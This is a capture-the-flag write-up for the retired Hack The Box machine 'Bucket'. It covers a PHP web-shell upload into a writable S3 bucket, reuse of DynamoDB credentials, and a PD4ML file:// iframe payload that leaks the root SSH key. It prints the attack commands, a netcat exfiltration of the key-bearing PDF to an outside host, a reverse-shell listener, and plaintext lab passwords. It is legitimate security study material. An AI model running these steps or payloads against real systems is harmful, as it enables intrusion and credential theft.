# Bucket

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Medium |
| **IP Address** | 10.10.10.212 |
| **Status** | Retired |

## Overview
Bucket is a medium Linux machine that runs **LocalStack**, a local AWS cloud emulator providing S3 and DynamoDB services. The main site's ad server is backed by an openly accessible S3 bucket, which is abused to upload a PHP web shell and get code execution. Enumerating DynamoDB tables recovered from the box then leaks additional credentials for lateral movement to the user `roy`. Root is obtained by abusing an internal PHP application (also using the DynamoDB client) that renders attacker-controlled HTML/DynamoDB data to PDF using a vulnerable Java PDF library, allowing local file disclosure of the root SSH key.

## Reconnaissance
Nmap against 10.10.10.212 found only:

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
```

Adding `bucket.htb` to `/etc/hosts` and browsing the site revealed a second host referenced in the page source, `s3.bucket.htb`, running `hypercorn-h11` (Python ASGI server): pointing at a second, API-style backend behind the main marketing site.

## Enumeration
Gobuster against `s3.bucket.htb` found:

```
/adserver
/health
/shell
/server-status
```

`GET /health` returned `{"services": {"s3": "running", "dynamodb": "running"}}`, and `/adserver/images/<key>` returned LocalStack's characteristic S3 `NoSuchKey` XML error: confirming the backend is a **LocalStack** instance emulating AWS S3 and DynamoDB, and that the ad server's images are served directly from an S3 bucket.

Using the AWS CLI configured against the LocalStack endpoint:

```bash
aws --endpoint-url http://s3.bucket.htb/ s3 ls
# -> adserver
aws --endpoint-url http://s3.bucket.htb/ s3 ls s3://adserver/images/
# -> various .jpg files served by the public site
```

confirmed the `adserver` bucket backs the images shown on the public website, i.e. objects written to that bucket are directly reachable over HTTP.

## Foothold
Since arbitrary objects can be uploaded to the `adserver` bucket and are then served by the web application, a PHP web shell (`rev.php`) was uploaded directly into the bucket and repeatedly requested until executed:

```bash
#!/bin/bash
aws --endpoint-url http://s3.bucket.htb s3 cp rev.php s3://adserver/
while true; do
    curl http://bucket.htb/rev.php &> /dev/null
done
```

A netcat listener (`nc -lvnp 1111`) caught the resulting reverse shell, providing initial code execution as the web server user.

Separately, scanning DynamoDB tables surfaced additional credentials:
```bash
aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
```
```
USERNAME  Mgmt       PASSWORD  Management@#1@#
USERNAME  Cloudadm   PASSWORD  Welcome123!
USERNAME  Sysadm     PASSWORD  n2vM-<_K_Q:.Aa2
```
`/etc/passwd` on the box revealed a local user `roy`. Reusing the `Sysadm` password recovered above (`n2vM-<_K_Q:.Aa2`) against `su roy` succeeded, providing a stable foothold as `roy`.

## Privilege Escalation
Running `linpeas.sh` on the box showed two internally-bound listening ports of interest: `127.0.0.1:4566` (LocalStack itself) and `127.0.0.1:8000`. Requesting `curl http://localhost:8000` (other clients like `nc`/`telnet` did not elicit the same response) revealed a local PHP application at `/var/www/bucket-app/index.php`:

```php
if($_POST["action"]==="get_alerts") {
    $client = new DynamoDbClient([
        'profile' => 'default', 'region'  => 'us-east-1',
        'version' => 'latest', 'endpoint' => 'http://localhost:4566'
    ]);
    $iterator = $client->getIterator('Scan', [
        'TableName' => 'alerts',
        'FilterExpression' => "title = :title",
        'ExpressionAttributeValues' => [":title" => ["S" => "Ransomware"]],
    ]);
    foreach ($iterator as $item) {
        $name = rand(1,10000).'.html';
        file_put_contents('files/'.$name, $item["data"]);
    }
    passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
}
```

This endpoint scans a DynamoDB table named `alerts` for an item with `title = "Ransomware"`, writes the attacker-controlled `data` field out as an HTML file, and then renders that HTML to PDF using **PD4ML** (`pd4ml_demo.jar`), a Java HTML-to-PDF converter known to support (and not sufficiently restrict) local file inclusion via `<iframe>`/`<img>` tags referencing `file://` URIs. The privilege escalation path was therefore:

1. Create the `alerts` table (as `roy`, against the LocalStack DynamoDB endpoint):
   ```bash
   aws dynamodb create-table --table-name alerts \
     --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
     --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
     --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 \
     --endpoint-url http://s3.bucket.htb
   ```
2. Insert a malicious "Ransomware" item whose `data` embeds an iframe pointing at the root SSH private key:
   ```bash
   aws dynamodb put-item --table-name alerts --item \
     '{"title": {"S": "Ransomware"}, "data": {"S": "<html><body><iframe src=\"/root/.ssh/id_rsa\"></iframe></body></html>"}}' \
     --endpoint-url http://s3.bucket.htb
   ```
3. Trigger the `get_alerts` action on the internal PHP app (contents in the output `files/` directory are cleared roughly every 30 seconds, so this had to be done quickly):
   ```bash
   curl --data "action=get_alerts" http://localhost:8000
   ```
4. Exfiltrate the generated `result.pdf` (which now embeds the contents of `/root/.ssh/id_rsa` rendered as text/image inside the PDF):
   ```bash
   nc -w 3 10.10.14.53 1234 < result.pdf
   ```

Extracting the recovered private key from the PDF and using it for SSH (`ssh -i id_rsa_root root@bucket.htb`) completed the privilege escalation to root.

## Lessons Learned
- Publicly-writable S3 buckets that are also directly served by a web application are effectively unauthenticated file-upload endpoints: treat write access to any bucket backing a live site as full code execution.
- HTML-to-PDF converters (PD4ML and similar libraries) that don't sandbox `file://` resource resolution are a classic local-file-disclosure/SSRF primitive when fed attacker-controlled HTML.
- Reused/shared credentials across "cloud" services (DynamoDB) and real system accounts (`roy`, `root`) make lateral movement trivial once one layer is compromised: enforce credential separation between application and OS layers.

## Tools & References
- `nmap`, `gobuster` for recon and enumeration.
- AWS CLI against the LocalStack endpoints for S3/DynamoDB enumeration and abuse.
- `linpeas.sh` for local privilege-escalation enumeration.
- **PD4ML** (`pd4ml_demo.jar`) HTML-to-PDF conversion library: abused for local file disclosure via crafted DynamoDB-sourced HTML.
- `id_rsa` and `id_rsa_root` (recovered SSH private keys for `roy` and `root`): omitted from the repository as sensitive key material; the recovery technique for the root key is detailed above.
- `result.pdf` (the PDF artifact whose rendered content exfiltrated the root SSH private key via the PD4ML local file disclosure): omitted from the repository since it contains sensitive key material; the exfiltration technique is detailed above.
